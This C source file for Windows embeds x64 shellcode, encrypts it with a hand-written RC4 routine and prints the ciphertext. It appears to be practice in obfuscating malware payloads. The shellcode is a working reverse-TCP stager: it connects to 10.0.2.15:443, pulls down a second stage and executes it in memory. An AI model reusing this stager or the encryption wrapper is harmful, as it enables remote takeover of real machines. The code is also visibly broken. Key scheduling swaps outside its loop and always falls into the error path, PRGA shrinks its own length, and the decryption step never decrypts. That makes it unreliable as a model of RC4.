#include <Windows.h>
#include <stdio.h>

typedef struct
{
	unsigned int i;
	unsigned int j;
	unsigned char s[256];

} Rc4Context;



void swap(unsigned char* a, unsigned char* b)
{
	unsigned char tmp = *a;
	*a = *b;
	*b = tmp;
}


void rc4init(Rc4Context* context, const unsigned char* key, size_t keyL)
{
	unsigned int i;
	unsigned int j;

	if (context == NULL || key == NULL)
	{
		goto error;
	}

	printf("[#] Setting Values to Zero...\n");
	context->i = 0;
	context->j = 0;

	for (i = 0; i < 256; i++)
	{
		context->s[i] = i;
	}

	printf("[+] Successfully Initialized S with Context!\n");

	for (i = 0, j = 0; i < 256; i++)
	{
		j = (j + context->s[i] + key[i % keyL]) % 256;
	}


	swap(&context->s[i], &context->s[j]);
	printf("[+] Successfully swapped values of s[i] and s[j]\n");


error:
	printf("[-] Context of Key Not Found!\n");
	return ERROR_INVALID_PARAMETER;
}

unsigned char* PRGA(Rc4Context* context, unsigned char* input, unsigned char* output, unsigned int len)
{
	printf("[#] Setting Values to Zero...\n");

	unsigned int i = context->i;
	unsigned int j = context->j;
	unsigned char* s = context->s;


	printf("[+] Adding XOR to input with RC4 Stream!\n");
	for (unsigned int k = 0; k < len; k++)
	{
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;

		swap(&context->s[i], &context->s[j]);

		if (input == NULL || output == NULL)
		{
			goto error;
		}

		if (input != NULL && output != NULL)
		{
			*output = *input ^ s[(s[i] + s[j]) % 256];

			input++;
			output++;
		}

		len--;
	}

	printf("[*] Resetting Values!\n");
	context->i = i;
	context->j = j;

error:
	printf("[-] Input And/Or Output Not Working!\n");
	return -1;
}


int main()
{
	unsigned char key[] = { 0x13, 0x37, 0xBE, 0xEF };


	unsigned char shellcode[] =
	{ "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
	"\x52\x51\x48\x31\xd2\x65\x48\x8b\x52\x60\x56\x48\x8b\x52"
	"\x18\x48\x8b\x52\x20\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48"
	"\x8b\x72\x50\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
	"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41"
	"\x51\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
	"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
	"\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x56\x48\xff\xc9\x4d\x31\xc9\x41\x8b\x34\x88"
	"\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1"
	"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
	"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
	"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41"
	"\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
	"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
	"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
	"\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
	"\x89\xe5\x49\xbc\x02\x00\x01\xbb\x0a\x00\x02\x0f\x41\x54"
	"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
	"\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
	"\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
	"\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
	"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
	"\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
	"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
	"\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
	"\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
	"\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
	"\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
	"\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
	"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
	"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
	"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
	"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
	"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
	"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
	"\xf0\xb5\xa2\x56\xff\xd5" };

	size_t shellcode_len = sizeof(shellcode);

	Rc4Context ctx = { 0 };
	rc4init(&ctx, key, sizeof(key));

	unsigned char* CipherText = malloc(shellcode_len);
	if (CipherText == NULL) {
		fprintf(stderr, "malloc failed\n");
		return 1;
	}


	// print out encrypted shellcode
	ZeroMemory(CipherText, shellcode_len);
	PRGA(&ctx, shellcode, CipherText, shellcode_len);
	printf("[*] CipherText (%zu bytes):\n", shellcode_len);
	for (size_t i = 0; i < shellcode_len; ++i) {
		printf("%02X", CipherText[i]);
		if ((i + 1) % 16 == 0) printf("\n");
		else printf(" ");
	}

	printf("\n");


	printf("[>] Press <Enter> to Decrypt...");
	getchar();

	rc4init(&ctx, key, sizeof(key));

	unsigned char* PlainText = malloc(shellcode_len);
	if (PlainText == NULL) {
		fprintf(stderr, "malloc failed\n");
		return 1;
	}


	// print out unencrypted shellcode
	ZeroMemory(PlainText, shellcode_len);
	PRGA(&ctx, shellcode, CipherText, shellcode_len);
	printf("[*] PlainText (%zu bytes):\n", shellcode_len);
	for (size_t i = 0; i < shellcode_len; ++i) {
		printf("%02X", CipherText[i]);
		if ((i + 1) % 16 == 0) printf("\n");
		else printf(" ");
	}


	printf("\n");
	printf("[+] Successfully Decrypted the Shellcode!\n");

	//Cleanup!
	printf("[>] Press <Enter> to Quit...");
	getchar();
	free(CipherText);
	free(PlainText);

	return 0;
}